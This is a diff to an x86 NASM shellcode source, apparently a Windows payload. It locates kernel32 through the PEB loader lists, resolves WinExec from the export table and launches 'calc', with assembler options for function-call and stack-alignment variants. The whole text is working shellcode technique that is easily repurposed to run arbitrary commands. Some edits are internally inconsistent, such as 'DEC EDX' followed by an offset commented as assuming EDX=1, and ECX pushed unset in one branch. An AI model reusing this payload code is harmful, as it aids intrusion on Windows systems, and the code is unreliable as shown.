@@ -12,38 +12,42 @@ SECTION .text
 
 ; WinExec *requires* 4 byte stack alignment
 %ifndef PLATFORM_INDEPENDENT
-%undef USE_COMMON                         ; not allowed as user-supplied
+  %undef USE_COMMON                       ; not allowed as user-supplied
 global _shellcode                         ; _ is needed because LINKER will add it automatically.
 _shellcode:
-%ifdef FUNC
+  %ifdef FUNC
      PUSHAD
-%endif
-%ifdef STACK_ALIGN
-%ifdef FUNC
+  %endif
+  %ifdef STACK_ALIGN
+    %ifdef FUNC
      MOV    EAX, ESP
-%endif
      AND    ESP, -4
-%ifdef FUNC
      PUSH   EAX
-%endif
-%endif
+    %else
+     AND    ESP, -4
+    %endif
+  %endif
     XOR     EDX, EDX                      ; EDX = 0
-%else
-%ifdef FUNC
+%elifndef USE_COMMON
+  %ifdef FUNC
     PUSHAD
-%endif
-    INC     EDX
+  %endif
+    DEC     EDX
 %endif
 %ifndef USE_COMMON
     PUSH    EDX                           ; Stack = 0
     PUSH    B2DW('c', 'a', 'l', 'c')      ; Stack = "calc", 0
     PUSH    ESP
     POP     ECX                           ; ECX = &("calc")
-%endif
     PUSH    EDX                           ; Stack = 0, "calc", 0
     PUSH    ECX                           ; Stack = &("calc"), 0, "calc", 0
 ; Stack contains arguments for WinExec
     MOV     ESI, [FS:EDX + 0x30]          ; ESI = [TEB + 0x30] = PEB
+%else
+    PUSH    ECX                           ; Stack = &("calc"), 0, "calc", 0
+; Stack contains arguments for WinExec
+    MOV     ESI, [FS:EDX + 0x2F]          ; ESI = [TEB + 0x30] = PEB (EDX=1)
+%endif
     MOV     ESI, [ESI + 0x0C]             ; ESI = [PEB + 0x0C] = PEB_LDR_DATA
     MOV     ESI, [ESI + 0x0C]             ; ESI = [PEB_LDR_DATA + 0x0C] = LDR_MODULE InLoadOrder[0] (process)
     LODSD                                 ; EAX = InLoadOrder[1] (ntdll)
@@ -77,27 +81,27 @@ find_winexec_x86:
     ADD     ESI, EDI                      ; ESI = kernel32 + offset(address table) = &(address table)
     ADD     EDI, [ESI + EBP * 4]          ; EDI = kernel32 + [&(address table)[WinExec ordinal]] = offset(WinExec) = &(WinExec)
     CALL    EDI                           ; WinExec(&("calc"), 0);
-%ifndef PLATFORM_INDEPENDENT
-%ifdef FUNC
+  %ifndef PLATFORM_INDEPENDENT
+    %ifdef FUNC
      POP    EAX
      POP    EAX
-%ifdef STACK_ALIGN
+      %ifdef STACK_ALIGN
      POP    ESP
-%endif
+      %endif
      POPAD
      RET
-%endif
-%elifdef FUNC
+    %endif
+  %elifdef FUNC
      POP    EAX
      POP    EAX
      POPAD
-%ifdef STACK_ALIGN
+    %ifdef STACK_ALIGN
      POP    ESP
-%endif
-%ifdef CLEAN
-     POP    EDX
+    %endif
+    %ifdef CLEAN
+     XCHG   EDX, EAX
      POP    EAX
-%endif
+    %endif
      RET
-%endif
+  %endif
 %endif
